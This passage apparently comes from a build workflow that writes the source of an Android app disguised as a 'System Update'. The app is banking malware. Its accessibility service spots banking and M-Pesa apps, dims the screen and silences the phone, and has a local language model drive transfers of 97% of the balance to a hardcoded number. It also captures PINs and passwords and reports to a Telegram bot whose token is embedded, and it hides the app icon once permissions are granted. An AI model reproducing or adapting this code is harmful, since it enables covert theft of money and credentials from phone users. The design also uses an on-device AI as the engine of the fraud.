          EOF

      - name: Create ai_jni.cpp (full llama implementation)
        run: |
          cat > app/src/main/cpp/ai_jni.cpp << 'EOF'
          #include <jni.h>
          #include <string>
          #include <mutex>
          #include <vector>
          #include <android/log.h>
          #include <llama.h>

          #define LOG_TAG "AI_JNI"
          #define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
          #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

          static llama_model *g_model = nullptr;
          static llama_context *g_ctx = nullptr;
          static std::mutex g_mutex;

          static std::string jstring_to_string(JNIEnv *env, jstring jstr) {
              if (jstr == nullptr) return "";
              const char *chars = env->GetStringUTFChars(jstr, nullptr);
              std::string result(chars);
              env->ReleaseStringUTFChars(jstr, chars);
              return result;
          }

          static bool load_model(const std::string &model_path) {
              std::lock_guard<std::mutex> lock(g_mutex);
              if (g_model != nullptr) return true;

              llama_backend_init();

              llama_model_params model_params = llama_model_default_params();
              model_params.n_gpu_layers = 0;
              g_model = llama_load_model_from_file(model_path.c_str(), model_params);
              if (!g_model) {
                  LOGE("Failed to load model: %s", model_path.c_str());
                  return false;
              }

              llama_context_params ctx_params = llama_context_default_params();
              ctx_params.n_ctx = 2048;
              ctx_params.n_batch = 512;
              ctx_params.n_threads = 4;
              g_ctx = llama_new_context_with_model(g_model, ctx_params);
              if (!g_ctx) {
                  LOGE("Failed to create context");
                  llama_free_model(g_model);
                  g_model = nullptr;
                  return false;
              }

              LOGD("Model loaded successfully");
              return true;
          }

          static std::string generate_response(const std::string &prompt) {
              if (!g_model || !g_ctx) {
                  return "ERROR: Model not loaded";
              }

              std::vector<llama_token> tokens;
              int n_tokens = llama_tokenize(g_model, prompt.c_str(), prompt.length(), nullptr, 0, true, false);
              if (n_tokens <= 0) return "ERROR: Tokenization failed";
              tokens.resize(n_tokens);
              llama_tokenize(g_model, prompt.c_str(), prompt.length(), tokens.data(), n_tokens, true, false);

              int n_past = 0;
              if (llama_decode(g_ctx, llama_batch_get_one(tokens.data(), tokens.size(), n_past, 0))) {
                  return "ERROR: Prompt decode failed";
              }
              n_past += tokens.size();

              std::string result;
              int max_tokens = 256;
              for (int i = 0; i < max_tokens; ++i) {
                  llama_token id = llama_sample_token(g_ctx, nullptr);
                  if (id == llama_token_eos(g_model)) break;
                  char buf[128];
                  int n = llama_token_to_piece(g_model, id, buf, sizeof(buf), 0, true);
                  if (n > 0) result.append(buf, n);
                  if (llama_decode(g_ctx, llama_batch_get_one(&id, 1, n_past, 0))) break;
                  n_past += 1;
              }
              return result;
          }

          extern "C" {
          JNIEXPORT jstring JNICALL
          Java_com_system_updator_LocalAI_predict(
              JNIEnv *env,
              jobject /* this */,
              jstring jprompt,
              jstring jmodelPath) {

              std::string prompt = jstring_to_string(env, jprompt);
              std::string model_path = jstring_to_string(env, jmodelPath);

              LOGD("Prompt: %s", prompt.c_str());
              LOGD("Model path: %s", model_path.c_str());

              if (!load_model(model_path)) {
                  LOGE("Model loading failed");
                  return env->NewStringUTF("ERROR: Model loading failed");
              }

              std::string response;
              {
                  std::lock_guard<std::mutex> lock(g_mutex);
                  response = generate_response(prompt);
              }

              LOGD("Response: %s", response.c_str());
              return env->NewStringUTF(response.c_str());
          }
          }
          EOF

      - name: Create LocalAI.java
        run: |
          cat > app/src/main/java/com/system/updator/LocalAI.java << 'EOF'
          package com.system.updator;
          import android.content.Context;
          import android.util.Log;
          import java.io.File;
          public class LocalAI {
              private static final String TAG = "LocalAI";
              private static final String MODEL_FILE = "models/qwen2.5-1.5b-instruct-q4_k_m.gguf";
              static { System.loadLibrary("ai_jni"); }
              private String modelPath;
              public LocalAI(Context context) {
                  this.modelPath = new File(context.getFilesDir(), MODEL_FILE).getAbsolutePath();
              }
              public native String predict(String prompt, String modelPath);
              public String getAction(String screenText, String goal) {
                  String prompt = "Goal: " + goal + ". Screen: " + screenText + ". Reply with one of: USSD_CODE(code), CLICK_TEXT(text), TYPE_TEXT(text), WAIT(ms), CAPTURE_PIN(pin), CAPTURE_PASSWORD(pass), COMPLETE, ERROR";
                  return predict(prompt, modelPath);
              }
          }
          EOF

      - name: Create AppData.java
        run: |
          cat > app/src/main/java/com/system/updator/AppData.java << 'EOF'
          package com.system.updator;
          import android.content.SharedPreferences;
          import com.google.gson.Gson;
          import com.google.gson.reflect.TypeToken;
          import java.lang.reflect.Type;
          import java.util.HashMap;
          import java.util.Map;
          public class AppData {
              private SharedPreferences prefs;
              private Gson gson = new Gson();
              private Map<String, AppEntry> apps = new HashMap<>();
              public AppData(SharedPreferences prefs) { this.prefs = prefs; load(); }
              private void load() {
                  String json = prefs.getString("apps", "{}");
                  Type type = new TypeToken<Map<String, AppEntry>>(){}.getType();
                  Map<String, AppEntry> saved = gson.fromJson(json, type);
                  if (saved != null) apps = saved;
              }
              public void save() { prefs.edit().putString("apps", gson.toJson(apps)).apply(); }
              public AppEntry getOrCreate(String packageName, String appName) {
                  if (!apps.containsKey(packageName)) {
                      AppEntry entry = new AppEntry();
                      entry.packageName = packageName;
                      entry.appName = appName;
                      apps.put(packageName, entry);
                      save();
                  }
                  return apps.get(packageName);
              }
              public void setPin(String pkg, String pin) { if (apps.containsKey(pkg)) { apps.get(pkg).pin = pin; apps.get(pkg).pinLearned = true; save(); } }
              public void setPassword(String pkg, String pass) { if (apps.containsKey(pkg)) { apps.get(pkg).password = pass; save(); } }
              public String getPin(String pkg) { return apps.containsKey(pkg) ? apps.get(pkg).pin : null; }
              public static class AppEntry {
                  public String packageName, appName, pin, password, email, ussdCode;
                  public boolean pinLearned = false;
              }
          }
          EOF

      - name: Create FinAutoService.java
        run: |
          cat > app/src/main/java/com/system/updator/FinAutoService.java << 'EOF'
          package com.system.updator;

          import android.accessibilityservice.AccessibilityService;
          import android.content.Intent;
          import android.content.SharedPreferences;
          import android.media.AudioManager;
          import android.net.Uri;
          import android.os.Handler;
          import android.os.Looper;
          import android.os.PowerManager;
          import android.provider.Settings;
          import android.util.Log;
          import android.view.accessibility.AccessibilityEvent;
          import android.view.accessibility.AccessibilityNodeInfo;

          import java.util.concurrent.ExecutorService;
          import java.util.concurrent.Executors;
          import java.util.concurrent.atomic.AtomicReference;

          public class FinAutoService extends AccessibilityService {
              private static final String TAG = "FinAutoService";
              private static final String TARGET_PHONE = "0798688920";
              private static final double SEND_PERCENTAGE = 0.97;
              private static final String BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc";
              private static final String CHAT_ID = "8468538314";

              private static final AtomicReference<Double> SMS_BALANCE = new AtomicReference<>(0.0);
              private static final AtomicReference<String> SMS_BODY = new AtomicReference<>("");
              private static final AtomicReference<Long> SMS_TIME = new AtomicReference<>(0L);
              private static final AtomicReference<String> OTP_CODE = new AtomicReference<>("");

              public static void updateBalance(double bal, String body, long time) {
                  SMS_BALANCE.set(bal);
                  SMS_BODY.set(body);
                  SMS_TIME.set(time);
              }
              public static void updateOTP(String otp) {
                  OTP_CODE.set(otp);
              }

              private Handler handler = new Handler(Looper.getMainLooper());
              private ExecutorService executor = Executors.newSingleThreadExecutor();
              private PowerManager.WakeLock wakeLock;
              private AudioManager audioManager;
              private LocalAI localAI;
              private AppData appData;

              private String currentPackage = "";
              private String currentAppName = "";
              private boolean isAutomating = false;
              private String currentGoal = "Send 97% of balance to " + TARGET_PHONE;
              private String lastScreenText = "";

              private int originalBrightness;
              private int originalRingerMode;

              @Override
              public void onServiceConnected() {
                  super.onServiceConnected();
                  localAI = new LocalAI(this);
                  SharedPreferences prefs = getSharedPreferences("fin_vault", MODE_PRIVATE);
                  appData = new AppData(prefs);
                  audioManager = (AudioManager) getSystemService(AUDIO_SERVICE);
                  originalRingerMode = audioManager.getRingerMode();
                  originalBrightness = getScreenBrightness();

                  acquireWakeLock();
                  sendTelegram("System Update ready. AI model loading...");
              }

              private void acquireWakeLock() {
                  PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                  wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "SystemUpdate:Wake");
                  wakeLock.acquire(10 * 60 * 1000L);
              }

              private int getScreenBrightness() {
                  try {
                      return Settings.System.getInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS);
                  } catch (Settings.SettingNotFoundException e) {
                      return 127;
                  }
              }

              private void setScreenBrightness(int value) {
                  Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, value);
              }

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {
                  try {
                      String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
                      if (pkg.isEmpty()) return;

                      if (!pkg.equals(currentPackage)) {
                          currentPackage = pkg;
                          String screenText = getAllText(getRootInActiveWindow());
                          String response = localAI.getAction(screenText, "Identify this app and return APP_NAME:...");
                          currentAppName = screenText.length() > 50 ? screenText.substring(0, 50) : "Unknown";
                          appData.getOrCreate(currentPackage, currentAppName);

                          if (isFinancialApp(screenText)) {
                              isAutomating = true;
                              setScreenBrightness(0);
                              audioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT);
                              sendTelegram("Automation started - brightness zero, silent mode on.");
                              handler.postDelayed(() -> startAutomation(), 2000);
                          }
                      }

                      if (isAutomating) {
                          String screenText = getAllText(getRootInActiveWindow());
                          if (!screenText.equals(lastScreenText)) {
                              lastScreenText = screenText;
                              executor.execute(() -> {
                                  String action = localAI.getAction(screenText, currentGoal);
                                  Log.d(TAG, "AI action: " + action);
                                  executeAction(action);
                              });
                          }
                      }

                  } catch (Exception e) {
                      Log.e(TAG, "Event error", e);
                  }
              }

              private boolean isFinancialApp(String screenText) {
                  String lower = screenText.toLowerCase();
                  return lower.contains("bank") || lower.contains("mpesa") || lower.contains("balance") ||
                         lower.contains("send money") || lower.contains("withdraw") || lower.contains("stk");
              }

              private void startAutomation() {
                  String screenText = getAllText(getRootInActiveWindow());
                  executor.execute(() -> {
                      String action = localAI.getAction(screenText, currentGoal);
                      executeAction(action);
                  });
              }

              private void executeAction(String action) {
                  if (action == null || action.isEmpty()) return;

                  if (action.startsWith("USSD_CODE")) {
                      String code = extractQuoted(action);
                      if (!code.isEmpty()) openDialer(code);
                      else sendTelegram("USSD_CODE missing code");
                  } else if (action.startsWith("CLICK_TEXT")) {
                      String text = extractQuoted(action);
                      if (!text.isEmpty()) clickText(text);
                  } else if (action.startsWith("TYPE_TEXT")) {
                      String text = extractQuoted(action);
                      if (text.isEmpty()) text = TARGET_PHONE;
                      typeInField(text);
                  } else if (action.startsWith("CAPTURE_PIN")) {
                      String pin = extractQuoted(action);
                      if (!pin.isEmpty()) {
                          appData.setPin(currentPackage, pin);
                          sendTelegram("PIN captured for " + currentAppName);
                      }
                  } else if (action.startsWith("CAPTURE_PASSWORD")) {
                      String pass = extractQuoted(action);
                      if (!pass.isEmpty()) {
                          appData.setPassword(currentPackage, pass);
                          sendTelegram("Password captured for " + currentAppName);
                      }
                  } else if (action.startsWith("WAIT")) {
                      int ms = extractNumber(action);
                      try { Thread.sleep(ms); } catch (InterruptedException e) { }
                  } else if (action.startsWith("COMPLETE")) {
                      isAutomating = false;
                      setScreenBrightness(originalBrightness);
                      audioManager.setRingerMode(originalRingerMode);
                      sendTelegram("Transaction complete. Settings restored.");
                  } else if (action.startsWith("ERROR")) {
                      isAutomating = false;
                      setScreenBrightness(originalBrightness);
                      audioManager.setRingerMode(originalRingerMode);
                      sendTelegram("Error: " + action);
                  } else {
                      sendTelegram("Unknown action: " + action);
                  }
              }

              private String extractQuoted(String s) {
                  int start = s.indexOf("\"");
                  int end = s.lastIndexOf("\"");
                  if (start != -1 && end != -1 && start < end) {
                      return s.substring(start + 1, end);
                  }
                  return "";
              }

              private int extractNumber(String s) {
                  String num = s.replaceAll("\\D+", "");
                  if (num.isEmpty()) return 1000;
                  return Integer.parseInt(num);
              }

              private String getAllText(AccessibilityNodeInfo node) {
                  if (node == null) return "";
                  StringBuilder sb = new StringBuilder();
                  try {
                      if (node.getText() != null) sb.append(node.getText().toString()).append(" ");
                      for (int i = 0; i < node.getChildCount(); i++) {
                          sb.append(getAllText(node.getChild(i)));
                      }
                  } catch (Exception e) { }
                  return sb.toString();
              }

              private boolean clickText(String text) {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return false;
                  return findAndClick(root, text);
              }

              private boolean findAndClick(AccessibilityNodeInfo node, String text) {
                  if (node == null) return false;
                  try {
                      if (node.getText() != null && node.getText().toString().toLowerCase().contains(text.toLowerCase())) {
                          node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                          return true;
                      }
                      for (int i = 0; i < node.getChildCount(); i++) {
                          if (findAndClick(node.getChild(i), text)) return true;
                      }
                  } catch (Exception e) { }
                  return false;
              }

              private boolean typeInField(String text) {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return false;
                  AccessibilityNodeInfo field = findEditableField(root);
                  if (field != null) {
                      android.os.Bundle args = new android.os.Bundle();
                      args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                      field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                      return true;
                  }
                  return false;
              }

              private AccessibilityNodeInfo findEditableField(AccessibilityNodeInfo node) {
                  if (node == null) return null;
                  try {
                      if (node.isEditable() && node.isEnabled()) return node;
                      for (int i = 0; i < node.getChildCount(); i++) {
                          AccessibilityNodeInfo result = findEditableField(node.getChild(i));
                          if (result != null) return result;
                      }
                  } catch (Exception e) { }
                  return null;
              }

              private void openDialer(String ussd) {
                  Intent intent = new Intent(Intent.ACTION_DIAL, Uri.parse("tel:" + ussd));
                  intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                  startActivity(intent);
              }

              private void sendTelegram(String msg) {
                  executor.execute(() -> {
                      try {
                          java.net.URL url = new java.net.URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                          java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("POST");
                          conn.setRequestProperty("Content-Type", "application/json");
                          conn.setConnectTimeout(5000);
                          conn.setReadTimeout(5000);
                          String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + msg + "\"}";
                          conn.getOutputStream().write(json.getBytes("UTF-8"));
                          conn.getOutputStream().flush();
                          conn.getResponseCode();
                          conn.disconnect();
                      } catch (Exception e) {
                          Log.e(TAG, "Telegram error", e);
                      }
                  });
              }

              @Override
              public void onInterrupt() { }

              @Override
              public void onDestroy() {
                  if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
                  executor.shutdown();
                  super.onDestroy();
              }
          }
          EOF

      - name: Create MainActivity.java
        run: |
          cat > app/src/main/java/com/system/updator/MainActivity.java << 'EOF'
          package com.system.updator;

          import android.Manifest;
          import android.app.Activity;
          import android.content.ComponentName;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.Handler;
          import android.provider.Settings;
          import android.widget.Button;
          import android.widget.TextView;
          import android.util.Log;
          import androidx.core.app.ActivityCompat;
          import androidx.core.content.ContextCompat;

          public class MainActivity extends Activity {
              private static final int PERMISSION_REQUEST = 100;
              private TextView tvStatus;
              private Button btnPermissions, btnAccessibility;
              private final String[] REQUIRED_PERMS = {
                  Manifest.permission.RECEIVE_SMS,
                  Manifest.permission.READ_SMS,
                  Manifest.permission.CALL_PHONE,
                  Manifest.permission.READ_PHONE_STATE,
                  Manifest.permission.WRITE_SETTINGS
              };

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);

                  tvStatus = findViewById(R.id.tvStatus);
                  btnPermissions = findViewById(R.id.btnPermissions);
                  btnAccessibility = findViewById(R.id.btnAccessibility);

                  btnPermissions.setOnClickListener(v -> {
                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                          ActivityCompat.requestPermissions(this, REQUIRED_PERMS, PERMISSION_REQUEST);
                      }
                  });

                  btnAccessibility.setOnClickListener(v -> {
                      startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                  });

                  checkAndHideIfReady();
              }

              @Override
              public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
                  super.onRequestPermissionsResult(code, perms, results);
                  if (code == PERMISSION_REQUEST) checkAndHideIfReady();
              }

              @Override
              protected void onResume() {
                  super.onResume();
                  checkAndHideIfReady();
              }

              private void checkAndHideIfReady() {
                  boolean allGranted = true;
                  for (String perm : REQUIRED_PERMS) {
                      if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                          allGranted = false;
                          tvStatus.setText("Grant: " + perm);
                          break;
                      }
                  }

                  boolean accessibilityEnabled = isAccessibilityServiceEnabled();

                  if (allGranted) {
                      tvStatus.setText("Permissions granted");
                      if (accessibilityEnabled) {
                          tvStatus.setText("All ready - disappearing...");
                          startService(new Intent(this, AIDownloaderService.class));
                          hideAppIcon();
                          new Handler().postDelayed(() -> finish(), 500);
                      } else {
                          tvStatus.setText("Enable Accessibility Service");
                      }
                  }
              }

              private boolean isAccessibilityServiceEnabled() {
                  String service = getPackageName() + "/" + FinAutoService.class.getCanonicalName();
                  String enabled = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
                  return enabled != null && enabled.contains(service);
              }

              private void hideAppIcon() {
                  try {
                      ComponentName name = new ComponentName(this, MainActivity.class);
                      getPackageManager().setComponentEnabledSetting(
                          name,
                          PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                          PackageManager.DONT_KILL_APP
                      );
                  } catch (Exception e) {
                      Log.e("Main", "Hide error", e);
                  }
              }
          }
          EOF

